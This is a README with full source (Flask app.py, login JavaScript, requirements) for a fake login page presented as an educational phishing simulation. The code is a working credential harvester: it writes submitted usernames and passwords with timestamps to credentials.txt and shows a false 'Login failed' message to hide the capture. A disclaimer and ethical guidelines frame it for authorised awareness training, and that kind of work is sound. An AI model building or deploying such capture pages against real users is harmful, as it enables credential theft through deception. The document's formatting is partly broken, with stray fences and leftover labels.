# 🎯 Flask Educational Login Page – Credential Capture Simulation

## ⚠️ Legal Disclaimer

> **This project is strictly for educational and ethical testing purposes only.**  
> It is intended to help developers, penetration testers, and security researchers understand how phishing works so they can protect users from real-world attacks.  
> **Any unauthorized, malicious, or illegal use of this project is strictly prohibited.**  
> The author is not responsible for any misuse or damage caused by this tool.

## 📚 About This Project

This is a simple Flask-based web application that simulates a fake login page.  
It accepts user credentials (username and password) and writes them to a local file (`credentials.txt`).  
The primary goal is to raise awareness about phishing risks and help improve defensive strategies through ethical demonstrations.

## 🧠 Educational Use Cases

- Security awareness training  
- Ethical hacking demonstrations  
- Capture-the-flag (CTF) exercises  
- Simulated phishing tests in controlled environments  

## 📁 Project Structure
project/
│
├── static/ # Static assets (css, js, images)
│ ├── css/
│ ├── js/
│ └── images/
│
├── templates/
│ └── index.html # Fake login page UI
│
├── app.py # Flask backend logic
├── credentials.txt # Captured login data
├── requirements.txt # Python dependencies
└── README.md # Project documentation

text

## 🚀 How to Run

### 1. Clone the Repository

```bash
git clone https://github.com/your-username/educational-login-sim.git
cd educational-login-sim
2. Set Up a Virtual Environment (Recommended)
bash
python -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate
3. Install Dependencies
bash
pip install -r requirements.txt
4. Start the Flask Server
bash
python app.py
Then open your browser and visit:
http://127.0.0.1:5000

🛠 Technologies Used
Python 3

Flask Web Framework

HTML, CSS, JavaScript

JSON APIs

Local text file logging

💾 What Happens on Login?
When a user enters a username and password:

The credentials are sent via JavaScript as a JSON object to the /login route

Flask backend receives the POST request

The credentials are written to credentials.txt

A fake error message is shown to simulate a failed login attempt

Example logged data:

text
testuser:testpassword
2023-01-01 12:00:00 - admin:password123
🧪 Sample JavaScript (Frontend)
javascript
function login() {
    var loginuser = document.getElementById("username").value;
    var pass = document.getElementById("password").value;
    
    if (loginuser && pass) {
        fetch("/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ loginuser, password: pass })
        }).then(res => res.json())
          .then(data => alert(data.message));
    } else {
        alert("Invalid username or password.");
    }
}
✅ Ethical Guidelines
If you plan to use this tool for a demo or training:

✔ Always get written permission if testing with real users
❌ Do not deploy on public websites or production environments
🔐 Make it clear that the page is part of a simulation
🧹 Delete all captured data after the test or training session

📜 License
This project is licensed under the MIT License – free to use, modify, and distribute with attribution.

👨‍💻 Author
Educational Project by [YourName]
Security Awareness & Ethical Hacking Trainer

Stay secure. Stay informed.

text

### Additional Files:

1. **requirements.txt**
Flask==2.3.2
Werkzeug==2.3.7

text

2. **app.py**
```python
from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get("loginuser")
        password = data.get("password")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open("credentials.txt", "a") as f:
            f.write(f"{timestamp} - {username}:{password}\n")
            
        return jsonify({
            "message": "Login failed. Incorrect username or password."
        })
    except Exception as e:
        return jsonify({"message": f"Error: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)
This README provides:

Clear legal disclaimer

Project description

Setup instructions

Technical details

Ethical guidelines

Complete documentation
